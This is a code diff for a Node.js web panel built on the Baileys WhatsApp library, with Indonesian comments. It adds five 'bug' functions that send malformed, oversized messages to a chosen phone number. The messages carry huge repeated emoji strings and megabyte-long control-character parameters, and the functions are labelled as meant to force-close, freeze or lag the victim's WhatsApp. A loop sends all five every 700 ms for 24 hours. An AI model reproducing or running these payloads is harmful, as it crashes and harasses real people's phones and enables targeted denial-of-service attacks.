@@ -12,7 +12,9 @@ const {
 default: makeWASocket,
 useMultiFileAuthState,
 DisconnectReason,
-fetchLatestWaWebVersion
+fetchLatestWaWebVersion,
+generateWAMessageFromContent,
+proto
 } = require("@whiskeysockets/baileys");
 
 const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
@@ -27,11 +29,10 @@ app.use(cookieParser());
 const sessions = new Map();
 const file_session = "./sessions.json";
 const sessions_dir = "./auth";
-
 let sock;
 
-// ==================== SENDER MANAGER (VIA WEB) ====================
-let senderData = null; 
+// ==================== SENDER MANAGER ====================
+let senderData = null;
 const SENDER_FILE = "./sender.json";
 const SENDER_LIFETIME_MS = 24 * 60 * 60 * 1000;
 
@@ -105,26 +106,23 @@ app.get("/api/sender", (req, res) => {
 
 app.post("/api/sender/add", (req, res) => {
   const { number } = req.body;
-  
   if (!number || !/^\d+$/.test(number)) {
     return res.status(400).json({ error: "Nomor tidak valid!" });
   }
-  
   const result = setSender(number);
   res.json({ 
     success: true, 
-    message: `Sender ${number} berhasil ditambahkan!`,
+    message: `✅ Sender ${number} berhasil ditambahkan!`,
     sender: result
   });
 });
 
 app.post("/api/sender/remove", (req, res) => {
   removeSender();
-  res.json({ success: true, message: "Sender berhasil dihapus!" });
+  res.json({ success: true, message: "✅ Sender berhasil dihapus!" });
 });
 
-// ==================== WHATSAPP FUNCTIONS ====================
-
+// ==================== WHATSAPP CONNECTION ====================
 const saveActive = (BotNumber) => {
   const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
   if (!list.includes(BotNumber)) {
@@ -171,9 +169,48 @@ const initializeWhatsAppConnections = async () => {
   }
 };
 
-// ==================== BUG FUNCTIONS ====================
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 
-async function SendBlank(target) {
+// ==================== 🔥 BUG FUNCTIONS GACCOR MAX! ====================
+
+// 1. FORCE CLOSE - Bikin WhatsApp Force Close
+async function ForceClose(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "💀".repeat(100000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_message"
+        }
+      }
+    }
+  };
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 2. FREEZE - Bikin WhatsApp Freeze/Lag
+async function Freeze(target) {
   const msg = {
     stickerMessage: {
       url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
@@ -206,7 +243,6 @@ async function SendBlank(target) {
       }
     }
   };
-
   await sock.relayMessage("status@broadcast", msg, {
     statusJidList: [target],
     additionalNodes: [{
@@ -221,13 +257,72 @@ async function SendBlank(target) {
   });
 }
 
-async function SuperBlank(target) {
+// 3. DELAY UI - Bikin UI WhatsApp Lambat
+async function DelayUI(target) {
   const msg = {
     viewOnceMessage: {
       message: {
         interactiveResponseMessage: {
           body: { 
-            text: "⚠️" + "⬛".repeat(50000), 
+            text: "⏳".repeat(80000) + "⬛".repeat(50000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+        }
+      }
+    }
+  };
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 4. NEWSLETTER FLOOD - Bikin Notifikasi Berlebih
+async function NewsletterFlood(target) {
+  const msg = {
+    newsletterAdminInviteMessage: {
+      newsletterJid: "120363321780343299@newsletter",
+      newsletterName: "⚠️".repeat(10000) + "💀".repeat(10000),
+      caption: "❌".repeat(10000) + "⬛".repeat(10000),
+      inviteExpiration: "999999999"
+    }
+  };
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 5. CALL PERMISSION FLOOD
+async function CallPermissionFlood(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "📞".repeat(90000), 
             format: "DEFAULT" 
           },
           nativeFlowResponseMessage: {
@@ -240,7 +335,6 @@ async function SuperBlank(target) {
       }
     }
   };
-
   await sock.relayMessage("status@broadcast", msg, {
     statusJidList: [target],
     additionalNodes: [{
@@ -255,36 +349,97 @@ async function SuperBlank(target) {
   });
 }
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function DelayFlood(durationHours, target) {
+// ==================== 🔥 EXECUTE ALL BUGS ====================
+async function ExecuteAllBugs(durationHours, target) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
+  let success = 0;
+  let failed = 0;
+
+  console.log(chalk.blue(`
+╔═══════════════════════════════════════╗
+║   🔥 GACCOR ULTIMATE EXECUTION      ║
+║   Target : ${target}                   
+║   Duration : ${durationHours} jam      
+╚═══════════════════════════════════════╝
+  `));
 
   const sendNext = async () => {
     if (Date.now() - startTime >= totalDurationMs) {
-      console.log(`✅ Selesai! Total: ${count} dikirim`);
+      console.log(chalk.green(`
+╔═══════════════════════════════════════╗
+║   ✅ EXECUTION COMPLETED!            ║
+║   Total: ${count} cycles              
+║   Success: ${success}                 
+║   Failed: ${failed}                   
+╚═══════════════════════════════════════╝
+      `));
       return;
     }
 
     try {
+      // Kirim 5 jenis bug sekaligus!
       await Promise.all([
-        SendBlank(target),
-        SuperBlank(target),
-        sleep(300)
+        ForceClose(target),
+        Freeze(target),
+        DelayUI(target),
+        NewsletterFlood(target),
+        CallPermissionFlood(target)
       ]);
+      
       count++;
-      console.log(chalk.yellow(`[${count}] Blank sent to ${target}`));
+      success += 5;
+      console.log(chalk.yellow(`💥 [${count}] 5x bug sent to ${target} (${success} total)`));
+      
       setTimeout(sendNext, 700);
     } catch (error) {
-      console.error(`❌ Error: ${error.message}`);
+      failed++;
+      console.error(chalk.red(`❌ Error: ${error.message}`));
       setTimeout(sendNext, 1500);
     }
   };
   sendNext();
+}
+
+// ==================== 🔥 EXECUTE SPECIFIC BUG ====================
+async function ExecuteBug(mode, target) {
+  console.log(chalk.blue(`🔥 Executing ${mode} on ${target}`));
+  
+  try {
+    switch(mode) {
+      case 'forceclose':
+        await ForceClose(target);
+        break;
+      case 'freeze':
+        await Freeze(target);
+        break;
+      case 'delayui':
+        await DelayUI(target);
+        break;
+      case 'newsletter':
+        await NewsletterFlood(target);
+        break;
+      case 'callflood':
+        await CallPermissionFlood(target);
+        break;
+      case 'all':
+      default:
+        await Promise.all([
+          ForceClose(target),
+          Freeze(target),
+          DelayUI(target),
+          NewsletterFlood(target),
+          CallPermissionFlood(target)
+        ]);
+        break;
+    }
+    console.log(chalk.green(`✅ ${mode} sent to ${target}`));
+    return true;
+  } catch (error) {
+    console.error(chalk.red(`❌ ${mode} failed: ${error.message}`));
+    return false;
+  }
 }
 
 // ==================== WEB ROUTES ====================
@@ -351,7 +506,6 @@ app.get("/execution", (req, res) => {
     return;
   }
 
-  // Validasi nomor
   if (!/^\d+$/.test(targetNumber)) {
     const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
     fs.readFile(versePath, "utf8", (err, html) => {
@@ -361,7 +515,6 @@ app.get("/execution", (req, res) => {
     return;
   }
 
-  // Cek sender aktif
   const sender = getSender();
   if (!sender) {
     const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
@@ -372,22 +525,21 @@ app.get("/execution", (req, res) => {
     return;
   }
 
-  // Jalankan bug
   const target = `${targetNumber}@s.whatsapp.net`;
   
   try {
-    console.log(`🔥 ${chalk.green('EXECUTING')} ${mode} to ${targetNumber} via ${sender.number}`);
+    console.log(`🔥 Mode: ${mode} | Target: ${targetNumber} | Sender: ${sender.number}`);
     
-    if (mode === "delay") {
-      DelayFlood(24, target);
-    } else if (mode === "blank") {
-      DelayFlood(48, target);
+    // Eksekusi berdasarkan mode
+    if (mode === 'all' || mode === 'gacor') {
+      // GACOR MODE - Kirim semua bug selama 24 jam
+      ExecuteAllBugs(24, target);
     } else {
-      DelayFlood(12, target);
+      // Single shot mode
+      ExecuteBug(mode, target);
     }
     
     lastExecution = Date.now();
-    
     res.redirect(`/execution?justExecuted=true&target=${targetNumber}&mode=${mode}`);
   } catch (err) {
     console.error("❌ Error:", err.message);
@@ -410,9 +562,15 @@ app.get("/logout", (req, res) => {
 initializeWhatsAppConnections();
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`✅ Server running on port ${PORT}`);
-  console.log(`✅ Domain: https://onyxcore-production.up.railway.app`);
-  console.log(`✅ Sender aktif: ${getSender() ? getSender().number : 'Belum ada'}`);
+  console.log(chalk.green(`
+╔═══════════════════════════════════════╗
+║   🚀 ONYX CORE - GACCOR ULTIMATE     ║
+║   Port : ${PORT}                         
+║   Domain : https://onyxcore-production.up.railway.app
+║   Sender : ${getSender() ? getSender().number : 'Belum ada'}
+║   Status : ONLINE ✅                   
+╚═══════════════════════════════════════╝
+  `));
 });
 
 process.on('uncaughtException', (err) => {
